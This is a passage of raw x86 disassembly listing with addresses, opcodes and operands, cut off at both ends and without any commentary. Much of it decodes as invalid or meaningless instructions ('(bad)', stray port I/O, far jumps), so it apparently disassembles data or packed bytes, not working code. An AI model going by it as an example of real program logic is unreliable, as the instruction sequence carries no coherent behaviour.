  40bb16:	and    ebx,edi
  40bb18:	mov    ebp,0x822fdfd9
  40bb1d:	loop   0x40bacf
  40bb1f:	cwde   
  40bb20:	mov    DWORD PTR [ebp-0x16],0x750521ff
  40bb27:	and    ah,bl
  40bb29:	sbb    al,0x4f
  40bb2b:	and    al,0x4e
  40bb2d:	push   ss
  40bb2e:	lds    edi,FWORD PTR [edx-0x47]
  40bb31:	xchg   BYTE PTR [ebx],dl
  40bb33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb34:	pusha  
  40bb35:	and    eax,DWORD PTR [esi-0x3]
  40bb38:	inc    esp
  40bb39:	es sbb al,0x9d
  40bb3c:	out    dx,eax
  40bb3d:	jo     0x40bb7f
  40bb3f:	push   esi
  40bb40:	dec    esp
  40bb41:	inc    eax
  40bb42:	xchg   esp,eax
  40bb43:	repnz xabort 0xdd
  40bb47:	add    ebx,0x18
  40bb4a:	jge    0x40bb13
  40bb4c:	hlt    
  40bb4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb4e:	stos   DWORD PTR es:[edi],eax
  40bb4f:	push   ecx
  40bb50:	sti    
  40bb51:	pop    edx
  40bb52:	popa   
  40bb53:	mov    cl,0x75
  40bb55:	pop    ds
  40bb56:	inc    ecx
  40bb57:	sub    DWORD PTR [edx-0x7da14de2],ebx
  40bb5d:	adc    al,0xd9
  40bb5f:	inc    ecx
  40bb60:	push   ebx
  40bb61:	sub    esi,edi
  40bb63:	or     cl,dh
  40bb65:	sub    ecx,DWORD PTR [eax+ebx*4+0x17e10b2a]
  40bb6c:	or     edi,ebp
  40bb6e:	push   cs
  40bb6f:	mov    ecx,esp
  40bb71:	dec    esp
  40bb72:	mov    bh,BYTE PTR [edx]
  40bb74:	pop    esp
  40bb75:	stos   BYTE PTR es:[edi],al
  40bb76:	dec    ecx
  40bb77:	inc    edx
  40bb78:	jl     0x40bb84
  40bb7a:	xor    bl,ah
  40bb7c:	xchg   esi,eax
  40bb7d:	stos   BYTE PTR es:[edi],al
  40bb7e:	scas   eax,DWORD PTR es:[edi]
  40bb7f:	icebp  
  40bb80:	sbb    eax,edx
  40bb82:	pusha  
  40bb83:	jae    0x40bbc2
  40bb85:	aas    
  40bb86:	or     dh,BYTE PTR [ecx-0x56]
  40bb89:	std    
  40bb8a:	fs (bad) 
  40bb8c:	scas   eax,DWORD PTR es:[edi]
  40bb8d:	mov    edi,gs
  40bb8f:	fistp  DWORD PTR es:[ebp-0x76]
  40bb93:	fbstp  TBYTE PTR [edi+0x28eff315]
  40bb99:	push   ebp
  40bb9a:	push   ss
  40bb9b:	cmp    al,BYTE PTR [ebx-0x35582b72]
  40bba1:	cmp    eax,0x68c51f89
  40bba6:	aas    
  40bba7:	js     0x40bb63
  40bba9:	inc    esi
  40bbaa:	jbe    0x40bc00
  40bbac:	out    dx,al
  40bbad:	cmp    eax,0x90cba977
  40bbb2:	pop    ecx
  40bbb3:	test   bl,al
  40bbb5:	mov    bl,0xe9
  40bbb7:	das    
  40bbb8:	dec    ebx
  40bbb9:	out    dx,eax
  40bbba:	add    DWORD PTR [esp+esi*2-0x3c1f9f34],ebp
  40bbc1:	popa   
  40bbc2:	fmul   st(5),st
  40bbc4:	and    DWORD PTR [eax],edi
  40bbc6:	pop    eax
  40bbc7:	cmp    bl,0xff
  40bbca:	ret    0x4d88
  40bbcd:	push   esp
  40bbce:	mov    eax,0x2944e683
  40bbd3:	icebp  
  40bbd4:	mov    ah,0x9f
  40bbd6:	xchg   edx,eax
  40bbd7:	retf   0xd85c
  40bbda:	jo     0x40bb5e
  40bbdc:	add    ah,BYTE PTR [eax]
  40bbde:	jns    0x40bbd2
  40bbe0:	pop    edi
  40bbe1:	xchg   edx,edx
  40bbe3:	ins    BYTE PTR es:[edi],dx
  40bbe4:	dec    ecx
  40bbe5:	mov    ds:0x8dc1388,al
  40bbea:	stos   DWORD PTR es:[edi],eax
  40bbeb:	mov    dh,0x85
  40bbed:	push   esp
  40bbee:	pop    edx
  40bbef:	in     al,0x3a
  40bbf1:	outs   dx,BYTE PTR ds:[esi]
  40bbf2:	out    0x7b,al
  40bbf4:	repz mov ?,edx
  40bbf7:	push   edx
  40bbf8:	psraw  mm5,QWORD PTR [esi+0x194786ee]
  40bbff:	dec    edx
  40bc00:	fst    DWORD PTR [ebp+0x35be218c]
  40bc06:	mul    BYTE PTR ds:0xb80a6324
  40bc0c:	add    DWORD PTR [ebx],esi
  40bc0e:	sysenter 
  40bc10:	add    al,0xa
  40bc12:	jmp    0x27a8:0xd36a9531
  40bc19:	mov    al,ds:0xeeb7a2d6
  40bc1e:	jne    0x40bbac
  40bc20:	jmp    FWORD PTR [ebx]
  40bc22:	cs mov cl,0xe2
  40bc25:	jge    0x40bc5c
  40bc27:	mov    al,ds:0x3ce0d29e
  40bc2c:	sbb    eax,0xd9e70845
  40bc31:	jecxz  0x40bc63
  40bc33:	aad    0xf2
  40bc35:	js     0x40bc9a
  40bc37:	pop    ebx
  40bc38:	scas   eax,DWORD PTR es:[edi]
  40bc39:	arpl   WORD PTR [ebx+0x16],bp
  40bc3c:	push   esi
  40bc3d:	adc    BYTE PTR [eax+ecx*1-0x7a],0x94
  40bc42:	in     al,dx
  40bc43:	mov    BYTE PTR [ebp-0x18b00375],dl
  40bc49:	mov    bh,0x3a
  40bc4b:	jge    0x40bcbf
  40bc4d:	hlt    
  40bc4e:	mov    ds,edi
  40bc50:	out    dx,al
  40bc51:	dec    edi
  40bc52:	inc    ebx
  40bc53:	imul   edi,eax,0xfb27f3dd
  40bc59:	popa   
  40bc5a:	bound  eax,QWORD PTR [edx]
  40bc5c:	fld    DWORD PTR [ebp-0x4e]
  40bc5f:	in     eax,0xfa
  40bc61:	mov    dl,0xb0
  40bc63:	xor    bh,BYTE PTR [edi]
  40bc65:	add    ah,BYTE PTR [esi-0x11]
  40bc68:	jno    0x40bc24
  40bc6a:	hlt    
  40bc6b:	pop    esp
  40bc6c:	aas    
  40bc6d:	mov    bl,BYTE PTR [ebp-0x64]
  40bc70:	mov    esi,0xed2a758
  40bc75:	jns    0x40bcef
  40bc77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc78:	repnz mov DWORD PTR [eax+0x29],esi
  40bc7c:	repnz inc edx
  40bc7e:	adc    al,0xd5
  40bc80:	stos   DWORD PTR es:[edi],eax
  40bc81:	mov    ah,0x6e
  40bc83:	in     al,dx
  40bc84:	cmp    al,bh
  40bc86:	sbb    al,BYTE PTR [ebp+0x19]
  40bc89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc8a:	xchg   edi,eax
  40bc8b:	dec    edx
  40bc8c:	adc    DWORD PTR [edi+edi*4-0x6a],esi
  40bc90:	mov    cl,0xf
  40bc92:	sub    eax,0x260aecea
  40bc97:	popa   
  40bc98:	xchg   edx,eax
  40bc99:	mov    ds:0x57076f92,eax
  40bc9e:	test   eax,0xa4eabf23
  40bca3:	iret   
  40bca4:	add    esp,DWORD PTR [edx]
  40bca6:	mov    ds:0xea03e136,eax
  40bcab:	dec    ebp
  40bcac:	or     al,BYTE PTR [eax+edi*2-0x40]
  40bcb0:	rol    DWORD PTR [edi],cl
  40bcb2:	jl     0x40bc51
  40bcb4:	fistp  DWORD PTR [ecx]
  40bcb6:	arpl   WORD PTR [edi+ebx*4],si
  40bcb9:	fpatan 
  40bcbb:	mov    ch,0x20
  40bcbd:	push   ebx
  40bcbe:	shl    ebx,1
  40bcc0:	loopne 0x40bcec
  40bcc2:	pop    edx
  40bcc3:	jp     0x40bcd5
  40bcc5:	loop   0x40bd31
  40bcc7:	xor    al,0x70
  40bcc9:	mov    fs,ebx
  40bccb:	push   edi
  40bccc:	sahf   
  40bccd:	sbb    eax,0x3789d09f
  40bcd2:	mov    ch,BYTE PTR [edx+0x72]
  40bcd5:	clc    
  40bcd6:	sub    BYTE PTR ds:0xc904f213,dh
  40bcdc:	(bad)  
  40bcdd:	xor    DWORD PTR [esi],ebp
  40bcdf:	out    dx,eax
  40bce0:	sar    esp,1
  40bce2:	fstp   TBYTE PTR [ecx+0x32]
  40bce5:	xchg   esp,eax
  40bce6:	les    eax,FWORD PTR [esi]
  40bce8:	call   0x445b6dea
  40bced:	and    DWORD PTR [ecx],esp
  40bcef:	int3   
  40bcf0:	(bad)  
  40bcf2:	mov    dh,0xf4
  40bcf4:	dec    cl
  40bcf6:	pop    ecx
  40bcf7:	xchg   esi,eax
  40bcf8:	push   cs
  40bcf9:	loope  0x40bc86
  40bcfb:	in     eax,0x98
  40bcfd:	mov    WORD PTR ds:[edi-0x10],es
  40bd01:	int3   
  40bd02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd03:	mov    ah,0x21
  40bd05:	not    BYTE PTR [eax+0x2e31b437]
  40bd0b:	gs or  eax,0xc51e3d5c
  40bd11:	mov    edi,0xef4a4b9a
  40bd16:	fsub   DWORD PTR [ecx+ebx*1]
  40bd19:	sub    DWORD PTR [edx+0x64],esi
  40bd1c:	adc    dl,BYTE PTR [eax+eax*4]
  40bd1f:	jge    0x40bd49
  40bd21:	imul   esp,DWORD PTR [ebp-0x4e231c6],0xa34836c0
  40bd2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd2c:	das    
  40bd2d:	imul   sp,WORD PTR es:0x89e479d9,0x76
  40bd36:	fisttp QWORD PTR [edi+0x1a]
  40bd39:	pop    ebx
  40bd3a:	pop    ecx
  40bd3b:	icebp  
  40bd3c:	(bad)  
  40bd3d:	ins    DWORD PTR es:[edi],dx
  40bd3e:	xchg   ebp,eax
  40bd3f:	jge    0x40bdb2
  40bd41:	je     0x40bcc5
  40bd43:	gs mov dl,0xc1
  40bd47:	mov    al,ds:0x16dea0bb
  40bd4c:	pop    esp
  40bd4d:	pop    ebx
  40bd4e:	sub    eax,0x2b1dfa8e
  40bd53:	je     0x40bdc2
  40bd55:	rcr    DWORD PTR ds:0x170b174b,cl
  40bd5b:	mov    dl,0xa8
  40bd5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd5e:	xor    ecx,esi
  40bd60:	mov    WORD PTR [esi+eiz*4-0x5cac4659],fs
  40bd67:	xchg   ebp,eax
  40bd68:	js     0x40bdad
  40bd6a:	jbe    0x40bd3f
  40bd6c:	inc    ebp
  40bd6d:	add    dl,0x99
  40bd70:	jmp    0xd71407f1
  40bd75:	icebp  
  40bd76:	mov    ecx,DWORD PTR [esi+esi*4]
  40bd79:	add    al,0x6b
  40bd7b:	and    DWORD PTR gs:[edi],esp
  40bd7e:	inc    edi
  40bd7f:	(bad)  
  40bd80:	sbb    ecx,ecx
  40bd82:	sahf   
  40bd83:	inc    esp
  40bd84:	xor    DWORD PTR [edi+0x20],esi
  40bd87:	fs xchg edi,eax
  40bd89:	mov    esp,?
  40bd8b:	mov    ds,WORD PTR [esi-0x34]
  40bd8e:	retf   0xabcf
  40bd91:	mov    edx,0x31019ae5
  40bd96:	sar    dl,cl
  40bd98:	sti    
  40bd99:	daa    
  40bd9a:	rcr    ch,1
  40bd9c:	retf   0x964e
  40bd9f:	dec    ebp
  40bda0:	loope  0x40bd65
  40bda2:	add    DWORD PTR [eax],0x4bc57c69
  40bda8:	and    bl,dh
  40bdaa:	popa   
  40bdab:	(bad)  
  40bdac:	adc    BYTE PTR [edx-0x68a46d42],dh
  40bdb2:	sbb    ah,bh
  40bdb4:	int3   
  40bdb5:	arpl   cx,dx
  40bdb7:	fwait
  40bdb8:	dec    ebx
  40bdb9:	(bad)  
  40bdba:	cmp    edi,DWORD PTR [edx]
  40bdbc:	das    
  40bdbd:	sub    eax,0xd4d5243d
  40bdc2:	jns    0x40bd77
  40bdc4:	ins    BYTE PTR es:[edi],dx
  40bdc5:	call   0x2310c2a9
  40bdca:	xor    ebx,DWORD PTR [eax-0x732f618a]
  40bdd0:	fwait
  40bdd1:	and    al,0xa5
  40bdd3:	push   ecx
  40bdd4:	(bad)  
  40bdd5:	push   esp
  40bdd6:	popf   
  40bdd7:	cmp    edi,ecx
  40bdd9:	(bad)  
  40bdda:	cld    
  40bddb:	mul    BYTE PTR [esi+0x53]
  40bdde:	xchg   ecx,eax
  40bddf:	xor    DWORD PTR [ebx],edi
  40bde1:	pop    ebp
  40bde2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bde3:	xchg   esp,eax
  40bde4:	ins    DWORD PTR es:[edi],dx
  40bde5:	jp     0x40bdb4
  40bde7:	ss dec eax
  40bde9:	jp     0x40be21
  40bdeb:	mov    fs,WORD PTR [esi+ecx*2]
  40bdee:	push   ds
  40bdef:	(bad)  
  40bdf0:	mov    eax,0x71d170a0
  40bdf5:	jp     0x40bdba
  40bdf7:	jge    0x40bde1
  40bdf9:	stos   DWORD PTR es:[edi],eax
  40bdfa:	add    DWORD PTR [ecx],ebp
  40bdfc:	inc    esi
  40bdfd:	loop   0x40be6d
  40bdff:	hlt    
  40be00:	fwait
  40be01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be02:	adc    eax,0xa1251c14
  40be07:	fwait
  40be08:	xchg   ebx,eax
  40be09:	ss imul edx,esi,0x67
  40be0d:	stos   DWORD PTR es:[edi],eax
  40be0e:	jo     0x40be27
  40be10:	cmp    esi,ebx
  40be12:	repz (bad) 
  40be14:	lock push eax
  40be16:	xchg   di,ax
  40be18:	fsub   DWORD PTR [esi-0x68205ac7]
  40be1e:	sbb    ah,bh
  40be20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be21:	(bad)  
  40be23:	inc    esi
  40be24:	or     edx,DWORD PTR [ecx]
  40be26:	scas   eax,DWORD PTR es:[edi]
  40be27:	test   BYTE PTR [edx+0x39],ah
  40be2a:	in     eax,dx
  40be2b:	mov    ah,0x42
  40be2d:	jmp    0x6780:0x27a53b22
  40be34:	dec    eax
  40be35:	and    cl,BYTE PTR [edi]
  40be37:	xor    edx,DWORD PTR [ebx]
  40be39:	push   ebx
  40be3a:	cmp    dl,ch
  40be3c:	mov    al,0x47
  40be3e:	jle    0x40bdfb
  40be40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be41:	push   ss
  40be42:	push   0x961c3e3e
  40be47:	and    al,0xd6
  40be49:	cmp    al,BYTE PTR [edx-0xb]
  40be4c:	mov    al,ds:0xdaf3ee54
  40be51:	jbe    0x40be3a
  40be53:	mul    BYTE PTR [eax+0x24]
  40be56:	loopne 0x40bdeb
  40be58:	push   ecx
  40be59:	sub    BYTE PTR [esi-0x25684d6c],0xee
  40be60:	xchg   DWORD PTR [eax],ecx
  40be62:	xchg   edi,eax
  40be63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be64:	mov    ebp,0x91aa4bc9
  40be69:	push   0xec1e82fd
  40be6e:	add    al,0xac
  40be70:	push   ebx
  40be71:	or     BYTE PTR [esi-0x68978e5a],bh
  40be77:	pop    edx
  40be78:	or     esp,DWORD PTR [ecx]
  40be7a:	shr    DWORD PTR ds:0xcf9fcec2,1
  40be80:	mov    ah,0xa3
  40be82:	xor    edx,DWORD PTR [ebp-0x30ce2e9f]
  40be88:	dec    ecx
  40be89:	inc    ecx
  40be8a:	push   ss
  40be8b:	int    0xbd
  40be8d:	into   
  40be8e:	push   0x5f931dc6
  40be93:	cmp    dh,BYTE PTR [edx+0x5b44c489]
  40be99:	jp     0x40be3c
  40be9b:	je     0x40bee5
  40be9d:	mov    esp,0x4fb3f760
  40bea2:	jne    0x40bf1d
  40bea4:	sub    al,0xdc
  40bea6:	xchg   ebx,eax
  40bea7:	jae    0x40be50
  40bea9:	add    eax,0xeff32fc4
  40beae:	repnz cmc 
  40beb0:	loopne 0x40be91
  40beb2:	dec    eax
  40beb3:	and    al,0xf8
  40beb5:	rcl    BYTE PTR ds:0x37398be,1
  40bebb:	(bad)  [eax-0x381c5341]
  40bec1:	sbb    ecx,DWORD PTR [ecx-0x7ff3ec9b]
  40bec7:	imul   ebp,eax,0x26
  40beca:	sbb    cl,ch
  40becc:	lods   eax,DWORD PTR fs:[esi]
  40bece:	adc    BYTE PTR gs:[edi-0x2e],ah
  40bed2:	or     esi,DWORD PTR [ebx]
  40bed4:	sahf   
  40bed5:	cmp    ch,cl
  40bed7:	iret   
  40bed8:	arpl   bx,dx
  40beda:	pop    ss
  40bedb:	aad    0xe2
  40bedd:	sahf   
  40bede:	pop    ds
  40bedf:	push   es
  40bee0:	or     eax,0xf4249d84
  40bee5:	push   edx
  40bee6:	jbe    0x40be6c
  40bee8:	les    esp,FWORD PTR [edi+edi*2+0x33b4d761]
  40beef:	or     edx,DWORD PTR ds:[edi+edi*1]
  40bef3:	idiv   cl
  40bef5:	out    dx,eax
  40bef6:	sar    WORD PTR [edi+0x1cc68131],1
  40befd:	add    edi,DWORD PTR [ecx]
  40beff:	fisttp QWORD PTR [edi+0x8]
  40bf02:	scas   eax,DWORD PTR es:[edi]
  40bf03:	xchg   edx,eax
  40bf04:	mov    cl,0x60
  40bf06:	mov    BYTE PTR [ecx+0x1],cl
  40bf09:	retf   0xc799
  40bf0c:	ins    DWORD PTR es:[edi],dx
  40bf0d:	add    al,0x37
  40bf0f:	jne    0x40bf70
  40bf11:	dec    eax
  40bf12:	into   
  40bf13:	fild   QWORD PTR [ebp+0x27]
  40bf16:	xor    DWORD PTR [ebp+0x51c5fff8],eax
  40bf1c:	stos   BYTE PTR es:[edi],al
  40bf1d:	repnz fdiv st,st(3)
  40bf20:	retf   
  40bf21:	sub    al,al
  40bf23:	rcl    BYTE PTR [ebx+ebx*8-0x65],0x30
  40bf28:	sub    eax,0xb008cc3
  40bf2d:	je     0x40bf50
  40bf2f:	test   al,0x34
  40bf31:	rol    ebx,1
  40bf33:	xor    bl,BYTE PTR [ebp-0x67099b97]
  40bf39:	and    ebp,DWORD PTR [ebp+0x48fdc83d]
  40bf3f:	mov    WORD PTR [edi+eax*4],?
  40bf42:	inc    ebx
  40bf43:	test   esp,ecx
  40bf45:	pop    ss
  40bf46:	sbb    dl,ch
  40bf48:	xor    DWORD PTR [eax-0x587b4f38],edi
  40bf4e:	repz ficom WORD PTR [ecx-0xe1876d2]
  40bf55:	retf   
  40bf56:	mov    WORD PTR [ecx-0x3627a23c],ss
  40bf5c:	jbe    0x40bf90
  40bf5e:	mov    dl,0xbc
  40bf60:	mov    eax,0x767f990f
  40bf65:	push   edi
  40bf66:	retf   0x9c8e
  40bf69:	mov    ebp,0x902dba59
  40bf6e:	xchg   ebx,eax
  40bf6f:	add    BYTE PTR [ebx-0x2fa880],cl
  40bf75:	xor    bh,BYTE PTR [edi]
  40bf77:	imul   ecx,DWORD PTR [ecx+0x74],0xffffffce
  40bf7b:	sar    BYTE PTR [esi],cl
  40bf7d:	aaa    
  40bf7e:	ret    
  40bf7f:	mov    esi,0x6ae88642
  40bf84:	test   eax,0x1dc1e4f3
  40bf89:	adc    edi,esi
  40bf8b:	neg    DWORD PTR [ecx+0x5c]
  40bf8e:	and    DWORD PTR [edx],ecx
  40bf90:	daa    
  40bf91:	mov    esp,0x56234af1
  40bf96:	jmp    0x8a5b25dd
  40bf9b:	mov    fs,WORD PTR [esi-0x3]
  40bf9e:	es sahf 
  40bfa0:	arpl   WORD PTR [esi+0x29321932],sp
  40bfa6:	adc    eax,0xd59c5448
  40bfab:	ror    BYTE PTR [ebx],cl
  40bfad:	and    ch,al
  40bfaf:	or     dh,dh
  40bfb1:	push   edi
  40bfb2:	into   
  40bfb3:	mov    eax,ds:0xc550fd77
  40bfb8:	aas    
  40bfb9:	fnstcw WORD PTR [ecx-0x745acb8a]
  40bfbf:	push   ss
  40bfc0:	mov    bh,0xc6
  40bfc2:	sbb    DWORD PTR [eax],esi
  40bfc4:	xchg   esp,eax
  40bfc5:	ins    DWORD PTR es:[edi],dx
  40bfc6:	sub    cl,BYTE PTR [esi+0x40]
  40bfc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfca:	and    dl,al
  40bfcc:	fs lahf 
  40bfce:	inc    esi
  40bfcf:	sbb    eax,0x4d606505
  40bfd4:	idiv   BYTE PTR [edx-0x1b]
  40bfd7:	xor    al,0x9c
  40bfd9:	outs   dx,BYTE PTR ds:[esi]
  40bfda:	jno    0x40c020
  40bfdc:	stos   DWORD PTR es:[edi],eax
  40bfdd:	call   0x7e26:0x9339b43c
  40bfe4:	sub    eax,0x1fec51af
  40bfe9:	out    0xee,eax
  40bfeb:	mov    edx,0x953ff4ea
  40bff0:	mov    esp,0xf57f49ec
  40bff5:	gs stos DWORD PTR es:[edi],eax
  40bff7:	mov    esi,0xc69d5e94
  40bffc:	ror    DWORD PTR [edi-0x3d],1
  40bfff:	pop    edi
  40c000:	pop    es
  40c001:	in     eax,dx
  40c002:	sub    ebp,DWORD PTR [edx-0x78012242]
  40c008:	lds    ebx,FWORD PTR [ebp-0x39511e34]
  40c00e:	sub    al,0x68
  40c010:	das    
  40c011:	out    dx,al
  40c012:	fst    DWORD PTR [eax-0x31598ccc]
  40c018:	adc    ebp,ebp
  40c01a:	xchg   ebp,eax
  40c01b:	or     DWORD PTR [ebx],edi
  40c01d:	mov    al,ds:0xd102df18
  40c022:	inc    esi
  40c023:	sub    eax,DWORD PTR [esi-0x4b]
  40c026:	push   ebx
  40c027:	or     BYTE PTR [ebp+0x50],ch
  40c02a:	jno    0x40c023
  40c02c:	lahf   
  40c02d:	push   ebx
  40c02e:	jp     0x40c0a9
  40c030:	lds    ecx,FWORD PTR [eax]
  40c032:	(bad)  
  40c033:	es out dx,eax
  40c035:	ins    DWORD PTR es:[edi],dx
  40c036:	clc    
  40c037:	sub    eax,0xb51fc851
  40c03c:	rol    DWORD PTR [esi+0x4f],1
  40c03f:	jg     0x40c049
  40c041:	stos   BYTE PTR es:[edi],al
  40c042:	imul   ecx,DWORD PTR [ebx+0x23df52cc],0xbdcfdf3
  40c04c:	mov    eax,ds:0x3bc8bd0
  40c051:	mov    eax,ds:0x2948f646
  40c056:	sbb    DWORD PTR [edi],ecx
  40c058:	retf   
  40c059:	jl     0x40c0d9
  40c05b:	lds    ecx,FWORD PTR [esi-0x6]
  40c05e:	lahf   
  40c05f:	push   0xffffffd4
  40c061:	arpl   WORD PTR [ecx+ecx*2+0x484db0a9],si
  40c068:	xor    BYTE PTR [ecx],dh
  40c06a:	std    
  40c06b:	or     bh,ch
  40c06d:	or     DWORD PTR [ecx],ebp
  40c06f:	cwde   
  40c070:	ss out dx,al
  40c072:	jne    0x40c0cf
  40c074:	out    dx,eax
  40c075:	adc    eax,0x98f7a051
  40c07a:	into   
  40c07b:	(bad)  
  40c07c:	xor    BYTE PTR [ebx-0x487a0ba7],dl
  40c082:	jp     0x40c0e9
  40c084:	jmp    0xb96c580d
  40c089:	push   edx
  40c08a:	out    0x33,eax
  40c08c:	ret    0xfe41
  40c08f:	ret    0xfed7
  40c092:	gs jle 0x40c039
  40c095:	xchg   ebp,eax
  40c096:	xor    DWORD PTR [eax],ebp
  40c098:	pop    ecx
  40c099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c09a:	aam    0x3e
  40c09c:	push   ebp
  40c09d:	in     al,dx
  40c09e:	dec    edx
  40c09f:	add    dh,0xc4
  40c0a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0a3:	outs   dx,DWORD PTR ds:[esi]
  40c0a4:	aas    
  40c0a5:	mov    al,ds:0x389be4a3
  40c0aa:	cmp    esp,DWORD PTR ds:0x77e47640
  40c0b0:	dec    ebx
  40c0b1:	jo     0x40c0ee
  40c0b3:	cdq    
  40c0b4:	repnz inc ecx
  40c0b6:	cmp    ah,BYTE PTR [edi]
  40c0b8:	or     al,0xa6
  40c0ba:	cmp    DWORD PTR [esi-0x76],ebp
  40c0bd:	gs repz push eax
  40c0c0:	xchg   edx,eax
  40c0c1:	mov    cl,0xff
  40c0c3:	dec    ecx
  40c0c4:	push   ss
  40c0c5:	inc    ebp
  40c0c6:	lahf   
  40c0c7:	int    0x84
  40c0c9:	sub    bh,BYTE PTR [edx-0x853d74a]
  40c0cf:	cmp    al,0x23
  40c0d1:	mov    ds:0xadffd768,eax
  40c0d6:	mov    bh,0xf4
  40c0d8:	je     0x40c0cd
  40c0da:	das    
  40c0db:	and    DWORD PTR [edi+0x5c],esp
  40c0de:	mov    al,ds:0xbf73aabd
  40c0e3:	mov    ds:0x8079018f,eax
  40c0e8:	add    dl,BYTE PTR [eax+0x48]
  40c0eb:	ret    
  40c0ec:	ins    DWORD PTR es:[edi],dx
  40c0ed:	xor    BYTE PTR [edi+ebp*4],ch
  40c0f0:	inc    ebp
  40c0f1:	inc    edi
  40c0f2:	mov    esp,0xccec973b
  40c0f7:	push   0x5e
  40c0f9:	dec    ecx
  40c0fa:	and    cl,ah
  40c0fc:	bound  ebp,QWORD PTR ds:0x53dc16b1
  40c102:	test   DWORD PTR [edi],eax
  40c104:	cmp    dh,cl
  40c106:	out    0x69,al
  40c108:	stos   BYTE PTR es:[edi],al
  40c109:	and    BYTE PTR [ebp+0x51],al
  40c10c:	adc    al,0x56
  40c10e:	add    al,0x2
  40c110:	pop    es
  40c111:	mov    ds,WORD PTR [esi-0x38]
  40c114:	push   cs
  40c115:	inc    eax
  40c116:	ficomp WORD PTR [edi+0x6333f0ef]
  40c11c:	loope  0x40c0cc
  40c11e:	dec    eax
  40c11f:	mov    edx,ebx
  40c121:	jmp    0x9a9a60ea
  40c126:	lea    ebx,[esi]
  40c128:	push   esi
  40c129:	dec    ebp
  40c12a:	imul   edi,esi,0x2e1645cd
  40c130:	dec    esi
  40c131:	jge    0x40c11d
  40c133:	mov    dl,bh
  40c135:	push   ss
  40c136:	aam    0xe4
  40c138:	cli    
  40c139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c13a:	fld    QWORD PTR [ecx]
  40c13c:	loopne 0x40c0f5
  40c13e:	ret    
  40c13f:	cmp    BYTE PTR [ecx+0x5c94cbbc],dh
  40c145:	add    al,0x9c
  40c147:	int    0x64
  40c149:	out    0x85,al
  40c14b:	cdq    
  40c14c:	cld    
  40c14d:	adc    edi,DWORD PTR [ebx+0x49e3813a]
  40c153:	xor    BYTE PTR [edx-0x71],dl
  40c156:	loope  0x40c159
  40c158:	push   es
  40c159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c15a:	or     dl,al
  40c15c:	sub    al,0xd4
  40c15e:	push   edx
  40c15f:	xor    ebp,DWORD PTR [eax+0x1121eac0]
  40c165:	loop   0x40c19e
  40c167:	icebp  
  40c168:	(bad)  
  40c169:	fdiv   QWORD PTR [ebx]
  40c16b:	les    esp,FWORD PTR [edx-0x18]
  40c16e:	in     eax,0x9e
  40c170:	or     DWORD PTR [ecx+0x4f],ebx
  40c173:	adc    al,0xf0
  40c175:	xchg   ebx,eax
  40c176:	mov    edi,0xcee396bb
  40c17b:	in     eax,0x72
  40c17d:	dec    ebx
  40c17e:	or     DWORD PTR [eax+0x6cf8a87f],ecx
  40c184:	and    ebx,ebx
  40c186:	(bad)  
  40c187:	(bad)  
  40c189:	inc    DWORD PTR [eax-0x4d]
  40c18c:	test   al,0x21
  40c18e:	mov    dl,0x7e
  40c190:	or     DWORD PTR [ebp+0x9],0xfffffffe
  40c194:	retf   
  40c195:	(bad)  
  40c197:	call   0xe29e:0x488bdcbd
  40c19e:	jle    0x40c1f6
  40c1a0:	sbb    BYTE PTR [esp+edx*8],0xdd
  40c1a4:	dec    edx
  40c1a5:	push   ds
  40c1a6:	adc    edi,DWORD PTR [edx]
  40c1a8:	test   BYTE PTR [eax+0x2c],dh
  40c1ab:	pop    es
  40c1ac:	js     0x40c175
  40c1ae:	xchg   DWORD PTR [ebx+0x1f],ebp
  40c1b1:	leave  
  40c1b2:	cmp    ah,bl
  40c1b4:	inc    esp
  40c1b5:	or     dl,BYTE PTR [ecx+0x438e7a32]
  40c1bb:	xchg   BYTE PTR [ebx-0x5e62057c],ah
  40c1c1:	ins    BYTE PTR es:[edi],dx
  40c1c2:	loopne 0x40c1ae
  40c1c4:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1c6:	out    dx,eax
  40c1c7:	pop    esi
  40c1c8:	aaa    
  40c1c9:	dec    ebp
  40c1ca:	xor    DWORD PTR [ebp+0x64058d0],0x2a238763
  40c1d4:	imul   eax,DWORD PTR [edi-0x5b8317b0],0x77
  40c1db:	stos   DWORD PTR es:[edi],eax
  40c1dc:	test   eax,0x85e26982
  40c1e1:	xchg   esp,eax
  40c1e2:	and    BYTE PTR [ebp+0x31],ch
  40c1e5:	hlt    
  40c1e6:	push   ss
  40c1e7:	idiv   BYTE PTR [edi]
  40c1e9:	daa    
  40c1ea:	or     ah,cl
  40c1ec:	cmp    al,ch
  40c1ee:	bound  ebp,QWORD PTR [ecx]
  40c1f0:	adc    BYTE PTR [ebx+0x5672306b],0xef
  40c1f7:	daa    
  40c1f8:	fmul   QWORD PTR [ecx+ecx*4+0x56e5eb53]
  40c1ff:	repnz dec esp
  40c201:	mov    dl,0x9e
  40c203:	push   esi
  40c204:	in     eax,0x35
  40c206:	mov    edx,0xc2ae5a49
  40c20b:	xchg   ebx,eax
  40c20c:	(bad)
  40c20f:	sub    eax,0x3abfdd77
  40c214:	in     eax,0xfc
  40c216:	push   esi
  40c217:	xchg   DWORD PTR [eax+0x7a],edi
  40c21a:	test   BYTE PTR [edi+0x1da723c6],dl
  40c220:	ror    DWORD PTR [edi-0x1c2eeadf],1
  40c226:	adc    edx,DWORD PTR [esi]
  40c228:	xchg   edi,eax
  40c229:	rcr    BYTE PTR [edx],0xcd
  40c22c:	sub    eax,0x5f5f9cea
